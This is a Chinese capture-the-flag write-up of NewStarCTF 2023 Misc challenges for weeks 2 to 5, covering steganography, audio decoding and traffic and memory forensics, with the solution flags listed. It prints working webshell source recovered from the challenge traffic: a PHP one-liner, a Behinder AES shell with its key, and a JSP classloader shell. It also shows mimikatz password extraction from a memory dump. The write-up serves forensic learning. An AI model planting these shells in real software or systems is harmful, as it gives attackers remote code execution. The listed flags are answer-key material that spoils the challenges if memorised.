# NewStarCTF 2023 Misc

week1 的 misc 请移步上一篇 NewStarCTF

## WEEK2

#### 新建Word文档

直接复制出不来，改后缀为zip，document.xml得到内容

新佛曰	http://hi.pcmoe.net/buddha.html

flag{Th1s_F0_1s_s00_Cyp3r_495586e3df3a}

#### 永不消逝的电波

莫斯，在线梭了

https://morsecode.world/international/decoder/audio-decoder-adaptive.html

[![image-20231009090239639](assets/3014109-20231106224646513-976207940.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224646513-976207940.png)

flag{thebestctferisyou}

#### base!

base隐写

[![image-20231009090457698](assets/3014109-20231106224646936-2121560385.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224646936-2121560385.png)

[![image-20231009090506923](assets/3014109-20231106224648390-766160565.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224648390-766160565.png)

#### 1-序章

sql流量，拼接flag

先url解码



```py
import re

with open('access.log','r') as f:
    lines = f.read().strip().split('\n');

comp = re.compile(r',([0-9]{1,2}),1\)\)=([0-9]{2,3})', re.I)

flag = {}
for line in lines[::-1]:
    find = comp.findall(line)[0]
    if not flag.get(find[0]):
        flag[find[0]] = find[1];

for e in list(flag.values())[::-1]:
    print(chr(int(e)),end='')
    
//you_w4nt_s3cretflag{just_w4rm_up_s0_you_n3ed_h4rder_6026cd32},
```

#### WebShell的利用

按index.php的要求解码



```py
from base64 import b64decode
import uu

def decoder(cipher):
    crypt_list = list(cipher)
    After_decryption = ""
    num = 13
    for ch in crypt_list:
        ch = ord(ch)
        if ord('a') <= ch <= ord('z'):
            ch = ch + num
            if ch > ord('z'):
                ch -= 26
        if ord('A') <= ch <= ord('Z'):
            ch = ch + num
            if ch > ord('Z'):
                ch -= 26
        a = chr(ch)
        After_decryption += a
    return After_decryption;

class rio:
    def __init__(self,data):
        self.data=data.splitlines()
        self.data.insert(0,'begin 777 123')
        self.data.append('end')
    def readline(self):
        try:
            return self.data.pop(0).encode()
        except:

            pass
    def close(self):
        pass
    
class wio:
    def __init__(self):
        self.data=b""
    def write(self,data):
        self.data+=data
    def close(self):
        pass

f = open('index.txt','r').read();

def decode(val):
    if 'eval' in val:
        val = val.replace("eval(str_rot13(convert_uudecode(str_rot13(base64_decode('",'').replace('\')))));','');
    
    val = b64decode(val).decode();
    val = decoder(val)
    r=rio(val)
    w=wio()
    uu.decode(r,w)
    val = decoder(w.data.decode('utf-8'))
    if 'str_rot13' in val:
        val = decode(val);
    return val;

dec = decode(f)
print(dec)
```

得到	`error_reporting(0);($_GET['7d67973a'])($_POST['9fa3']);`

传参有了，命令执行

[![image-20231010194715036](assets/3014109-20231106224648638-107824652.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224648638-107824652.png)

#### Jvav

java单图盲水印

https://github.com/ww23/BlindWatermark

[![image-20231011115410875](assets/3014109-20231106224648913-1915183045.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224648913-1915183045.png)

[![image-20231011115352785](assets/3014109-20231106224649182-2103141063.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224649182-2103141063.png)

flag{3bb3c3a628a94c}

#### 游戏高手

控制台直接改分数

[![image-20231011120957400](assets/3014109-20231106224649433-1880393696.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224649433-1880393696.png)

然后自杀一下就给flag了

[![image-20231011120912364](assets/3014109-20231106224649682-205863602.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224649682-205863602.png)

其实是web题来着 但问题不大

## WEEK3

#### 阳光开朗大男孩

https://aghorler.github.io/emoji-aes/#

https://aghorler.github.io/emoji-aes/#

[![image-20231015222738209](assets/3014109-20231106224649948-865073482.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224649948-865073482.png)

[![image-20231015222726976](assets/3014109-20231106224650269-1254971110.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224650269-1254971110.png)

flag{3m0ji_1s_s0000_1nt3rest1ng_0861aada1050}

#### 大怨种

GIF分帧得到汉信码

https://tuzim.net/hxdecode/

[![image-20231015224009182](assets/3014109-20231106224650580-1595024065.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224650580-1595024065.png)

flag{1_d0nt_k0nw_h0w_to_sc4n_th1s_c0d3_acef808a868e}

#### 滴滴滴

DTMF音识别

[![image-20231015225803761](assets/3014109-20231106224651002-2140782935.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224651002-2140782935.png)

52563319066

[![image-20231016094804958](assets/3014109-20231106224651451-1707831975.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224651451-1707831975.png)

#### 键盘侠



```
tshark -r draobyek.pcapng -T fields -e usb.capdata > usbdata.txt
```

UsbKeyboardDataHacker

[![image-20231016095305699](assets/3014109-20231106224651819-114145207.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224651819-114145207.png)

knm

[![image-20231016095801052](assets/3014109-20231106224652096-719717424.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224652096-719717424.png)

两者结合一下，按uuid的格式筛选数据，按uuid（8-4-4-4-12）的格式

flag{9919aeb2-a450-2f5f-7bfc-89df4bfa8584}

#### 2-分析

> ```
> FLAG格式flag{md5(攻击者登录使用的用户名_存在漏洞的文件名_WebShell文件名)}
> ```

先导出全部http对象，拿d盾扫一波

WebShell文件名是wh1t3g0d.php

[![image-20231016102306767](assets/3014109-20231106224652388-1430951665.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224652388-1430951665.png)

搜一下username

[![image-20231016103931174](assets/3014109-20231106224652725-427372755.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224652725-427372755.png)

攻击者登录使用的用户名与密码：username=best_admin&password=so_hard_password

[![image-20231016104739049](assets/3014109-20231106224653040-2059422556.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224653040-2059422556.png)

存在漏洞的文件名是index.php

flag{4069afd7089f7363198d899385ad688b}

## WEEK4

#### R通大残

R通当然是R通道咯

[![image-20231022212422044](assets/3014109-20231106224653325-923264073.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224653325-923264073.png)

flag{a96d2cc1-6edd-47fb-8e84-bd953205c9f5}

#### 依旧是空白

PNG爆破宽高，得到密码：s00_b4by_f0r_y0u

宽:508(0x1fc)   高:1044(0x414)

[![image-20231029224017572](assets/3014109-20231106224653568-1485036517.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224653568-1485036517.png)

有密码那就是snow隐写

[![image-20231029224302614](assets/3014109-20231106224654085-981413025.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224654085-981413025.png)

#### 第一次取证

RS先扫一波

[![image-20231022213232911](assets/3014109-20231106224654545-447067430.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224654545-447067430.png)

那vol直接查

[![image-20231022222225472](assets/3014109-20231106224654867-1872614706.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224654867-1872614706.png)

base91解码

flag{a308067fc26625d31a421247adce3893}

#### Nmap

> 请给出Nmap扫描得到所有的开放端口用英文逗号分隔，端口号从小到大排列。 例如flag

过滤一下`SYN,ACK`包



```
tcp.connection.synack
```

[![image-20231023095835794](assets/3014109-20231106224655388-1435893390.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224655388-1435893390.png)

flag{80,3306,5000,7000,8021,9000}

#### 3-溯源

> 目前可以得知的是攻击者使用了冰蝎进行WebShell连接
>
> FLAG格式：flag{攻击者获取到的服务器用户名_服务器内网IP地址} 例如flag

顺着上题往下走



```
http.request.uri.path contains "wh1t3g0d.php"
```

[![image-20231029224524938](assets/3014109-20231106224655710-2099865333.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224655710-2099865333.png)

发现写入了shell.php



```
http.request.uri contains "shell.php"
```

查看POST的包，解test的base



```php
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b";
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```

得到了key=e45e329feb5d925b，以及加密模式为AES128，是冰蝎的shell，[在线解密网站](http://tools.bugscaner.com/cryptoaes/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTg1OTAzNDAsImZpbGVHVUlEIjoiZ1hxbWRWdmJPRXNYcG8zbyIsImlhdCI6MTY5ODU5MDA0MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODM0NzE2NjYyNn0.FiF22NglSGh-YrqI99k7Gdgz9nKdESMOzBcca_dUSko)

先把所有1.php的响应流量过滤出来，导出特定分组另存为



```
http.response_for.uri contains "/1.php"
```

在tcp.stream eq 19得到用户名：www-data

[![image-20231029225605400](assets/3014109-20231106224656108-2013805605.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224656108-2013805605.png)

在tcp.stream eq 18中可以得到服务器内网IP地址： 172.17.0.2

[![image-20231029225655807](assets/3014109-20231106224656431-841136528.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224656431-841136528.png)

flag{www-data_172.17.0.2}

## WEEK5

#### 隐秘的图片

像素异或

使用Stegsolve的Image Combiner即可

[![image-20231106190927333](assets/3014109-20231106224656745-374714230.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224656745-374714230.png)

flag{x0r_1m4ge_w1ll_g0t_fl4ggg_3394e4ecbb53}

#### ezhard

[![image-20231030085752533](assets/3014109-20231106224657057-1968319281.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224657057-1968319281.png)

是linux的磁盘文件，我喜欢改7z逃课，hint.png就是flag

flag{12bc2ba3-fa54-7b45-7f3d-f54ea6e45d7c}

#### BabyAntSword

> Flag格式：`flag{WebShell密码_服务器JAVA版本_攻击者删除的文件内容} 例如flag{cmd_8u231_nothinginhere}`

先过滤出POST的请求



```
http.request.method == POST
```

[![image-20231106210614685](assets/3014109-20231106224657345-517090581.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224657345-517090581.png)

可以看到一个压缩包，导出来（原始数据保存，在010editor导入16进制）

[![image-20231106210841857](assets/3014109-20231106224657677-688835594.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224657677-688835594.png)

把火绒关了，不然jsp直接被杀了



```jsp
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("n3wst4r");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```

是jsp的webshell，密码为 `n3wst4r`

蚁剑请求流量的分析需要删掉首部前两个字符



```
AvY2QgIi91c3IvbG9jYWwvdG9tY2F0IjtlbnY7ZWNobyBmNWNkOTtwd2Q7ZWNobyAwYTI1ZmJjMWM1
```

tcp.stream eq 39可以看到

[![image-20231106212246684](assets/3014109-20231106224658028-1799363622.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224658028-1799363622.png)

在env中可以得到Java版本

[![image-20231106212410580](assets/3014109-20231106224658309-586105533.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224658309-586105533.png)

JAVA版本为7u121

在tcp.stream eq 43得到执行的命令

[![image-20231106213009019](assets/3014109-20231106224658607-1224295534.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224658607-1224295534.png)

找对应的响应包拿到/.secret文件的内容



```
c5850a0c-dc03-1db2-4303-43d6fdf27985
```

**拼接：flag{n3wst4r_7u121_c5850a0c-dc03-1db2-4303-43d6fdf27985}**

#### Easymem

> （flag长度为42位），那就是uuid

桌面上有flag2

[![image-20231030092340436](assets/3014109-20231106224658884-1769822413.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224658884-1769822413.png)

83-5032-1056-

flag第一部分在ctf用户的密码，需使用mimikatz插件读取

若vol2与mimikatz安装存在问题，移步我[这篇文章](https://www.cnblogs.com/Mar10/p/17813665.html)

[![image-20231106202936041](assets/3014109-20231106224659210-872627367.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224659210-872627367.png)

flag{45a527fb-2f

查看进程



```
vol.py  -f /root/桌面/WIN-DOOJTVIN21M-20231005-091206.raw --profile=Win7SP1x64 pslist
```

[![image-20231106204609096](assets/3014109-20231106224659463-123174531.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224659463-123174531.png)

重点看这个画图的进程，给它dump下来



```
vol.py  -f /root/桌面/WIN-DOOJTVIN21M-20231005-091206.raw --profile=Win7SP1x64 memdump -p 1484 -D /root/桌面
```

[![image-20231106204806285](assets/3014109-20231106224659718-664133138.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224659718-664133138.png)

导入GIMP

调整为如下数据时得到flag3

[![image-20231106205358574](assets/3014109-20231106224700010-372793527.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224700010-372793527.png)

导入画图，翻转一下

[![image-20231106205530083](assets/3014109-20231106224700393-1573019435.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224700393-1573019435.png)

0b949b63a947}

**拼接：flag{45a527fb-2f83-5032-1056- 0b949b63a947}**

#### 新建Python文件

pyc剑龙隐写

[![image-20231106224550572](assets/3014109-20231106224700632-1137607791.png)](https://img2023.cnblogs.com/blog/3014109/202311/3014109-20231106224700632-1137607791.png)

## 小结

流量题出的好，其他隐写算是复习了一波，取证马马虎虎吧，这gimp确实没调出来

没有nt套题真好 : )